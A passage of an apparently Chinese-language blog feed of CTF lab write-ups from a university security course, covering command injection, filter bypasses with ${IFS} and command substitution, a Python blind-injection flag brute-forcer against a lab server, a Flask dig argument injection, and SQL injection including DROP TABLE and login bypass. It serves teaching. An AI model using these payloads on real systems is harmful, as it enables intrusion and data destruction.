href="https://youtu.be/-cMOv9QudOk?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘æ‰‹æŠŠæ‰‹ Python æ•™å­¸â€” å¾å…¥é–€åˆ°å…¥ä¾µ</a></li><li><a href="https://youtu.be/N60VGmhfhy0?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘WEB1</a></li><li><a href="https://youtu.be/PqydmB-IoYc?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘WEB2</a></li><li><a href="https://youtu.be/xjnAnrfApJo?list=PLFFwfkaPB2mqsfIQvdoT6xc0CziXhmrEV">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘ä¸æ˜¯ web3.0 çš„web3 - Vincent55</a></li><li><a href="https://youtu.be/nVXA9S9Y07M?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘Crypto1</a></li><li><a href="https://youtu.be/LtWiQxbMjwg?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘Crypto2</a></li><li><a href="https://youtu.be/8WVrUqjBsRE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘LinuxåŸºç¤æŒ‡ä»¤èˆ‡ä½¿ç”¨è€…ç®¡ç†</a></li><li><a href="https://youtu.be/pNhHXhPkNcE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘æ·ºè«‡ç¶²è·¯èˆ‡H T T P</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;å‰è¨€ &lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot;&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;æœ¬æ—¥é€²åº¦ï¼š&lt;/p&gt;
&lt;ul class=&quot;task-list&quot;&gt;
&lt;li&gt;&lt;label&gt;&lt;input type=&quot;checkbox&quot; checked=&quot;&quot;&gt;&lt;a href=&quot;https://youtu.be/PqydmB-IoYc?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z&quot;&gt;ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘WEB
2 - Lab&lt;/a&gt;&lt;/label&gt;&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="IThome 2024 éµäººè³½" scheme="https://moon-jam.me/categories/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/"/>
    
    <category term="ä¸€ç›´åˆ· CTF" scheme="https://moon-jam.me/categories/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/%E4%B8%80%E7%9B%B4%E5%88%B7-CTF/"/>
    
    
    <category term="è³‡å®‰" scheme="https://moon-jam.me/tags/%E8%B3%87%E5%AE%89/"/>
    
    <category term="CTF" scheme="https://moon-jam.me/tags/CTF/"/>
    
    <category term="IThome 2024 éµäººè³½" scheme="https://moon-jam.me/tags/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/"/>
    
  </entry>
  
  <entry>
    <title>IThome 2024 éµäººè³½ ä¸€ç›´åˆ· CTF - Day19</title>
    <link href="https://moon-jam.me/IThome_2024ironman_CTF_Day19/"/>
    <id>https://moon-jam.me/IThome_2024ironman_CTF_Day19/</id>
    <published>2024-09-21T16:00:00.000Z</published>
    <updated>2025-08-19T09:24:30.306Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€">å‰è¨€ <a href="#å‰è¨€" class="headerlink"></a></h2><p>æœ¬æ—¥é€²åº¦ï¼š</p><ul class="task-list"><li><label><input type="checkbox" checked=""><a href="https://youtu.be/PqydmB-IoYc?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘WEB2 - Lab</a></label></li></ul><span id="more"></span><h3 id="lab-login">Lab-login <a href="#lab-login" class="headerlink"></a></h3><p>é¡Œç›®å¾ˆå¥½å¿ƒæŠŠä»–æœƒæŸ¥è©¢çš„æŒ‡ä»¤åˆ—å‡ºä¾†äº†ï¼Œå¯ä»¥ç™¼ç¾ä»–éƒ½æœ‰ç”¨ <code>()</code>åŒ…èµ·ä¾†ï¼Œæ‰€ä»¥æˆªæ–·çš„æ™‚å€™è¦æ³¨æ„è¦æŠŠ <code>)</code> ä¹Ÿå¸¶ä¸Šï¼Œå°±èƒ½é †åˆ©Injection äº†ã€‚</p><figure><img data-src="https://i.imgur.com/IDavAlE.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/LO1unj3.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="dig-arguments">Dig Arguments <a href="#dig-arguments" class="headerlink"></a></h3><p>ä»–æœ‰æä¾›ç¶²ç«™çš„åŸå§‹ç¢¼ï¼Œæ˜¯ç”¨ flask å»ºçš„ï¼Œä¸‹é¢é€™å€‹æ˜¯ä¸»è¦é‚è¼¯</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">"/"</span>, methods=[<span class="string">"GET"</span>, <span class="string">"POST"</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dig</span>():</span><br><span class="line">    dig_result = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">"debug"</span>):</span><br><span class="line">        <span class="keyword">return</span> send_file(__name__ + <span class="string">".py"</span>)</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">"POST"</span>:</span><br><span class="line">        hostname1 = request.form[<span class="string">"hostname1"</span>]</span><br><span class="line">        hostname2 = request.form[<span class="string">"hostname2"</span>]</span><br><span class="line">        process = subprocess.Popen(</span><br><span class="line">            [<span class="string">"dig"</span>, hostname1, hostname2],</span><br><span class="line">            stdout=subprocess.PIPE,</span><br><span class="line">            stderr=subprocess.PIPE,</span><br><span class="line">        )</span><br><span class="line">        output, _ = process.communicate()</span><br><span class="line">        dig_result = output.decode()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"index.html"</span>, request=request, dig_result=dig_result)</span><br></pre></td></tr></tbody></table></figure><p><code>["dig", hostname1, hostname2]</code> é€™æ¨£çš„å¯«æ³•æœƒè®“æˆ‘å€‘æ‰“ç®—injection</p><p>è¬›å¸«çµ¦äº†ä¸€å€‹ <a href="https://gtfobins.github.io/">é…·é…·ç¶²ç«™</a>ï¼Œå¯ä»¥æŸ¥åˆ°å¾ˆå¤šåˆ©ç”¨ä¸€äº›<code>æœ¬ä¾†æ‡‰è©²ä¸æ˜¯ç”¨ä¾†è®€æª”æˆ–åŸ·è¡ŒæŒ‡ä»¤çš„</code>çš„æŒ‡ä»¤ä¾† bypass çš„æ–¹æ³•ï¼Œå°±æ‰¾åˆ°äº†é€™å€‹æ±æ±ï¼ŒæŒ‰ç…§é€™å€‹æ–¹æ³•å°±å¯ä»¥è®€åˆ° flagäº†ã€‚</p><figure><img data-src="https://i.imgur.com/rxkhZup.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/uKjFGSo.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h2 id="åƒè€ƒè³‡æ–™">åƒè€ƒè³‡æ–™ <a href="#åƒè€ƒè³‡æ–™" class="headerlink"></a></h2><ul><li><a href="https://youtu.be/-cMOv9QudOk?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘æ‰‹æŠŠæ‰‹ Python æ•™å­¸â€” å¾å…¥é–€åˆ°å…¥ä¾µ</a></li><li><a href="https://youtu.be/N60VGmhfhy0?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘WEB1</a></li><li><a href="https://youtu.be/PqydmB-IoYc?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘WEB2</a></li><li><a href="https://youtu.be/xjnAnrfApJo?list=PLFFwfkaPB2mqsfIQvdoT6xc0CziXhmrEV">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘ä¸æ˜¯ web3.0 çš„web3 - Vincent55</a></li><li><a href="https://youtu.be/nVXA9S9Y07M?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘Crypto1</a></li><li><a href="https://youtu.be/LtWiQxbMjwg?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘Crypto2</a></li><li><a href="https://youtu.be/8WVrUqjBsRE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘LinuxåŸºç¤æŒ‡ä»¤èˆ‡ä½¿ç”¨è€…ç®¡ç†</a></li><li><a href="https://youtu.be/pNhHXhPkNcE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘æ·ºè«‡ç¶²è·¯èˆ‡H T T P</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;å‰è¨€ &lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot;&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;æœ¬æ—¥é€²åº¦ï¼š&lt;/p&gt;
&lt;ul class=&quot;task-list&quot;&gt;
&lt;li&gt;&lt;label&gt;&lt;input type=&quot;checkbox&quot; checked=&quot;&quot;&gt;&lt;a href=&quot;https://youtu.be/PqydmB-IoYc?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z&quot;&gt;ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘WEB
2 - Lab&lt;/a&gt;&lt;/label&gt;&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="IThome 2024 éµäººè³½" scheme="https://moon-jam.me/categories/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/"/>
    
    <category term="ä¸€ç›´åˆ· CTF" scheme="https://moon-jam.me/categories/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/%E4%B8%80%E7%9B%B4%E5%88%B7-CTF/"/>
    
    
    <category term="è³‡å®‰" scheme="https://moon-jam.me/tags/%E8%B3%87%E5%AE%89/"/>
    
    <category term="CTF" scheme="https://moon-jam.me/tags/CTF/"/>
    
    <category term="IThome 2024 éµäººè³½" scheme="https://moon-jam.me/tags/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/"/>
    
  </entry>
  
  <entry>
    <title>IThome 2024 éµäººè³½ ä¸€ç›´åˆ· CTF - Day18</title>
    <link href="https://moon-jam.me/IThome_2024ironman_CTF_Day18/"/>
    <id>https://moon-jam.me/IThome_2024ironman_CTF_Day18/</id>
    <published>2024-09-20T16:00:00.000Z</published>
    <updated>2025-08-19T09:24:30.306Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€">å‰è¨€ <a href="#å‰è¨€" class="headerlink"></a></h2><p>æœ¬æ—¥é€²åº¦ï¼š</p><ul class="task-list"><li><label><input type="checkbox" checked=""><a href="https://youtu.be/PqydmB-IoYc?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘WEB2 - lab</a></label></li></ul><span id="more"></span><h2 id="ä¸Šèª²ç´€éŒ„">ä¸Šèª²ç´€éŒ„ <a href="#ä¸Šèª²ç´€éŒ„" class="headerlink"></a></h2><h3 id="lab---dig-blind">Lab - dig-blind <a href="#lab---dig-blind" class="headerlink"></a></h3><p>ä»–åªæœƒå›å‚³ <code>success</code> å’Œ <code>fail</code>ï¼Œå…ˆè©¦è©¦çœ‹<code>'; grep -q "NCKUCTF{d19_" /fl* &amp;&amp; exit 0 || exit 1'</code>ï¼Œå¥½æ¬¸ï¼Œä»–å›å‚³ <code>success</code> !!!!</p><p>ä½†æ¯ä¸€ä½éƒ½ç”¨äººå·¥çŒœæœ‰é»å¤ªæ…¢ï¼Œå¯ä»¥å¯«å€‹ç¨‹å¼æ ¹æ“šä»–å›å‚³çš„ 0 1 è¨Šè™Ÿåæ¨flag ï¼Œæœ€ç¬¨çš„æ–¹æ³•å°±æ˜¯ç›´æ¥ä¸€å€‹å€‹æ…¢æ…¢æšèˆ‰ï¼Œé€™æ¨£è¤‡é›œåº¦æœƒæ˜¯ O (NK) ï¼Œ Næ˜¯å­—ä¸²é•·åº¦ï¼ŒK æ˜¯æšèˆ‰çš„å­—å…ƒé›†æ•¸é‡ï¼Œæ ¹æ“šä¹‹å‰çš„è§€å¯Ÿå­—å…ƒé›†æ‡‰è©²æ˜¯<code>0123456789abcdefghijklmnopqrstuvwxyz_!{}</code>ï¼Œé›–ç„¶æˆ‘æƒ³åˆ°æ¯”è¼ƒå¥½çš„æ–¹æ³•æ˜¯æŠŠæ¯å€‹å­—è½‰ ASCIIï¼Œå†ç”¨äºŒé€²ä½è¡¨ç¤ºï¼Œé€™æ¨£å°±åªæœƒæœ€å¤š 7 æ¬¡å°±çŸ¥é“é‚£ä¸€å€‹å­—æ˜¯å•¥äº†ï¼Œèƒ½å£“åˆ°O (N)ï¼Œä½†é€™æ¨£å¯«æœ‰é»ç´¯ï¼Œè€Œä¸”å­—å…ƒé›†ä¹Ÿä¸ç®—å¤ªå¤šï¼Œè¦æ˜¯çœŸçš„ä¸è¡Œå°±å†æ‹¿å¤šåŸ·è¡Œç·’ä¾†ç”¨ä¹Ÿå¯ä»¥è®ŠæˆO (N)</p><p>æˆ‘çš„ python ç¨‹å¼ç¢¼ï¼š</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://140.116.246.59:28116/"</span></span><br><span class="line">prefix = <span class="string">"NCKUCTF{d19_"</span>  </span><br><span class="line">charset = <span class="string">"0123456789abcdefghijklmnopqrstuvwxyz_!}"</span>  </span><br><span class="line">flag = prefix</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> flag.endswith(<span class="string">"}"</span>):</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> charset:</span><br><span class="line">        payload = <span class="string">f"'; grep -q \"<span class="subst">{flag + char}</span>\" /fl* &amp;&amp; exit 0 || exit 1'"</span></span><br><span class="line">        data = {<span class="string">'name'</span>: payload}</span><br><span class="line">        </span><br><span class="line">        response = requests.post(url, data=data)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> response.text.count(<span class="string">"success"</span>) == <span class="number">2</span>:</span><br><span class="line">            flag += char</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f"Found: <span class="subst">{flag}</span>"</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f"Final Flag: <span class="subst">{flag}</span>"</span>)</span><br></pre></td></tr></tbody></table></figure><figure><img data-src="https://i.imgur.com/N6PEcTz.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h2 id="åƒè€ƒè³‡æ–™">åƒè€ƒè³‡æ–™ <a href="#åƒè€ƒè³‡æ–™" class="headerlink"></a></h2><ul><li><a href="https://youtu.be/-cMOv9QudOk?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘æ‰‹æŠŠæ‰‹ Python æ•™å­¸â€” å¾å…¥é–€åˆ°å…¥ä¾µ</a></li><li><a href="https://youtu.be/N60VGmhfhy0?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘WEB1</a></li><li><a href="https://youtu.be/PqydmB-IoYc?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘WEB2</a></li><li><a href="https://youtu.be/xjnAnrfApJo?list=PLFFwfkaPB2mqsfIQvdoT6xc0CziXhmrEV">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘ä¸æ˜¯ web3.0 çš„web3 - Vincent55</a></li><li><a href="https://youtu.be/nVXA9S9Y07M?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘Crypto1</a></li><li><a href="https://youtu.be/LtWiQxbMjwg?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘Crypto2</a></li><li><a href="https://youtu.be/8WVrUqjBsRE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘LinuxåŸºç¤æŒ‡ä»¤èˆ‡ä½¿ç”¨è€…ç®¡ç†</a></li><li><a href="https://youtu.be/pNhHXhPkNcE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘æ·ºè«‡ç¶²è·¯èˆ‡H T T P</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;å‰è¨€ &lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot;&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;æœ¬æ—¥é€²åº¦ï¼š&lt;/p&gt;
&lt;ul class=&quot;task-list&quot;&gt;
&lt;li&gt;&lt;label&gt;&lt;input type=&quot;checkbox&quot; checked=&quot;&quot;&gt;&lt;a href=&quot;https://youtu.be/PqydmB-IoYc?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z&quot;&gt;ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘WEB
2 - lab&lt;/a&gt;&lt;/label&gt;&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="IThome 2024 éµäººè³½" scheme="https://moon-jam.me/categories/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/"/>
    
    <category term="ä¸€ç›´åˆ· CTF" scheme="https://moon-jam.me/categories/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/%E4%B8%80%E7%9B%B4%E5%88%B7-CTF/"/>
    
    
    <category term="è³‡å®‰" scheme="https://moon-jam.me/tags/%E8%B3%87%E5%AE%89/"/>
    
    <category term="CTF" scheme="https://moon-jam.me/tags/CTF/"/>
    
    <category term="IThome 2024 éµäººè³½" scheme="https://moon-jam.me/tags/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/"/>
    
  </entry>
  
  <entry>
    <title>IThome 2024 éµäººè³½ ä¸€ç›´åˆ· CTF - Day17</title>
    <link href="https://moon-jam.me/IThome_2024ironman_CTF_Day17/"/>
    <id>https://moon-jam.me/IThome_2024ironman_CTF_Day17/</id>
    <published>2024-09-19T16:00:00.000Z</published>
    <updated>2025-08-19T09:24:30.306Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€">å‰è¨€ <a href="#å‰è¨€" class="headerlink"></a></h2><p>æœ¬æ—¥é€²åº¦ï¼š</p><ul class="task-list"><li><label><input type="checkbox" checked=""><a href="https://youtu.be/PqydmB-IoYc?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘WEB2 - å®Œ</a></label></li></ul><span id="more"></span><h2 id="ä¸Šèª²ç´€éŒ„">ä¸Šèª²ç´€éŒ„ <a href="#ä¸Šèª²ç´€éŒ„" class="headerlink"></a></h2><h3 id="injection-é§­å®¢çš„å¡«å­—éŠæˆ²">Injection (é§­å®¢çš„å¡«å­—éŠæˆ²) <a href="#injection-é§­å®¢çš„å¡«å­—éŠæˆ²" class="headerlink"></a></h3><figure><img data-src="https://i.imgur.com/y5iWGg3.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>æŠŠæ‰€æœ‰è»Šç‰Œéƒ½åˆªæ‰äº† xddd</p><figure><img data-src="https://i.imgur.com/WIwk4gl.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p><a href="https://youtu.be/WWJTsKaJT_g?si=Q3cZWVAqUkfB6Cvg">è®šè®šçš„å½±ç‰‡èªªæ˜</a></p><p>é€™æ¬¡æœƒæåˆ°çš„</p><figure><img data-src="https://i.imgur.com/3WVKgr6.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h4 id="code-injection">Code Injection <a href="#code-injection" class="headerlink"></a></h4><p>ä»¥ python eval èˆ‰ä¾‹</p><figure><img data-src="https://i.imgur.com/logfdq8.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>å…¶ä»–å¸¸è¦‹çš„å±éšªå‡½å¼</p><figure><img data-src="https://i.imgur.com/sJZbGSw.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>å¦‚ä½•é é˜²?</p><p>å¯ä»¥çœ‹çœ‹ <a href="https://github.com/odoo/odoo/blob/17.0/odoo/tools/safe_eval.py">é€™å€‹</a></p><p>Code Injection å¸¸å¸¸æœƒå‡ºç¾åœ¨ IOT è¨­å‚™ (åƒæ˜¯ç›£è¦–å™¨ã€TX link ä¹‹é¡çš„)</p><h4 id="command-injection">Command Injection <a href="#command-injection" class="headerlink"></a></h4><figure><img data-src="https://i.imgur.com/fizUAJk.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>æŒ‡ä»¤å°±æœƒè®Šæˆ <code>dig vincent55.tw; id</code></p><p>åŸºæœ¬æŠ€å·§ <code>;</code> <code>|</code> <code>&amp;&amp;</code><code>||</code></p><figure><img data-src="https://i.imgur.com/ggJZvGk.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>command substitution</p><figure><img data-src="https://i.imgur.com/mCveGNN.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>å¦‚æœç©ºç™½è¢«éæ¿¾äº† - ç”¨ <code>${IFS}</code> / <code>&lt;</code></p><figure><img data-src="https://i.imgur.com/MCQKUP0.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>å¦‚æœæœ‰ä¸€äº› keyword è¢«éæ¿¾äº†</p><figure><img data-src="https://i.imgur.com/69MmYeJ.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="lab---dig">Lab - dig <a href="#lab---dig" class="headerlink"></a></h3><p>é€™é¡Œå¥¹æœ‰æä¾›åŸå§‹ç¢¼ï¼Œå¯ä»¥çŸ¥é“èƒŒå¾Œçš„åŸ·è¡Œé‚è¼¯æ˜¯<code>&lt;pre&gt;&lt;?= system("dig '" . $_POST['name'] . "';") ?&gt;&lt;/pre&gt;</code>ï¼Œæ‰€ä»¥å¯ä»¥ç”¨ <code>';</code> ä¾†æˆªæ–· <code>dig</code>ç„¶å¾Œå°±èƒ½åœ¨å¾Œé¢è¼¸å…¥æƒ³è¦çš„æŒ‡ä»¤äº†ï¼Œå…ˆç”¨ <code>ls</code> æ‰¾åˆ° Flagçš„ä½ç½®ï¼Œç„¶å¾Œå†å°å‡ºä¾†å°±æ˜¯ç­”æ¡ˆæ‘Ÿ</p><figure><img data-src="https://i.imgur.com/t4QVkPM.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/9p1z9dA.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="lab---dig-waf1">Lab - dig waf1 <a href="#lab---dig-waf1" class="headerlink"></a></h3><p>é€™é¡Œå¤šæª”äº†ä¸€äº›å­—<code>blacklist = ['|', '&amp;', ';', '&gt;', '&lt;', "\n", 'flag'];</code>ï¼Œå¯ä»¥ç”¨ä¹‹å‰çš„ code substitution ä¾†ç¹é</p><figure><img data-src="https://i.imgur.com/aWF3spJ.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="lab---dig-waf2">Lab - dig waf2 <a href="#lab---dig-waf2" class="headerlink"></a></h3><p>é€™é¡Œå¤šæª”äº†ç©ºç™½ï¼Œç”¨ <code>${IFS}</code> å°±èƒ½é€šéäº†</p><figure><img data-src="https://i.imgur.com/Boo8ori.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="reverse-shell">Reverse shell <a href="#reverse-shell" class="headerlink"></a></h3><p>Normal shell: ssh</p><figure><img data-src="https://i.imgur.com/c5gRgjw.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>Reverse shell å°±æ˜¯æ”¹æˆå¾ server ä¸»å‹•é€£ç·šåˆ° client</p><figure><img data-src="https://i.imgur.com/2MRqmS8.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/rzza9V9.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p><a href="https://www.revshells.com/">é€™é‚Š</a> æœ‰å„ç¨®ä¸åŒçš„ reverseshell</p><p><a href="https://ngrok.com/download">ngrok</a>å¯ä»¥ç”¨ä¾†åå‘ä»£ç†ï¼Œé€™æ¨£å¦‚æœé€£æˆå¤§ç¶²è·¯å°±ä¸æœƒè¢«æ“‹ä¸€äº›æ±è¥¿äº†</p><h3 id="sql-injection">SQL Injection <a href="#sql-injection" class="headerlink"></a></h3><p>ç°¡ä»‹</p><figure><img data-src="https://i.imgur.com/jCbLoYT.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/diIYRxW.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/W0VqYqh.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p><code>SELECT title, subtitle, context FROM articles;</code><br>é€™é‚Šæ˜¯è¦æ‰¾å‡º title, subtitle, context é€™ä¸‰å€‹æ¬„ä½çš„è³‡æ–™</p><figure><img data-src="https://i.imgur.com/Eo7UdZC.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p><code>SELECT * FROM articles;</code><br>æ‰¾å‡ºæ‰€æœ‰æ¬„ä½çš„è³‡æ–™</p><figure><img data-src="https://i.imgur.com/haP21Dv.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p><code>SELECT * FROM articles WHERE id = 2;</code><br>æ‰¾å‡º id ç‚º 2 çš„è³‡æ–™</p><figure><img data-src="https://i.imgur.com/PZOX4J1.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>é€™é‚Šå°±æœ‰é»åƒæ˜¯å‰é¢ command injectionä¸€æ¨£ï¼Œå¯ä»¥è®“ä»–åšä¸€äº›å£å£çš„äº‹æƒ…</p><p><code>SELECT * FROM articles WHERE id = 3; DROP TABLE articles;</code></p><figure><img data-src="https://i.imgur.com/PSaEbhN.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>å¦å¤–å¦‚æœæ˜¯åœ¨è™•ç†ç™»å…¥çš„è³‡æ–™åº«æ˜¯ç”¨<code>SELECT * FROM user='' AND pass=</code>ä¾†åšåˆ¤æ–·å¸³å¯†æ˜¯å¦æ­£ç¢ºï¼Œé‚£å°±æœ‰å¯èƒ½ç™¼ç”Ÿä¸‹é¢ä¸€å¼µçš„å•é¡Œ</p><figure><img data-src="https://i.imgur.com/ddMisBO.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>è—‰ç”± <code>'</code> æˆªæ–· å’Œ <code>--</code>è¨»è§£çš„æ–¹å¼ï¼Œå¯ä»¥è®“ä»–ä¸ç®¡å¯†ç¢¼æ˜¯ä»€éº¼çš„ç‹€æ³ä¸‹ç™»å…¥</p><figure><img data-src="https://i.imgur.com/3MtXInv.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>åˆ†é¡</p><ul><li>Stacked: ç”¨åˆ†è™Ÿéš”é–‹å„ç¨®èªå¥</li><li>Union Based: ç”¨ UNION ä¾†å°‡å…©å€‹èªå¥åˆåœ¨ä¸€èµ·</li><li>Blind Based: 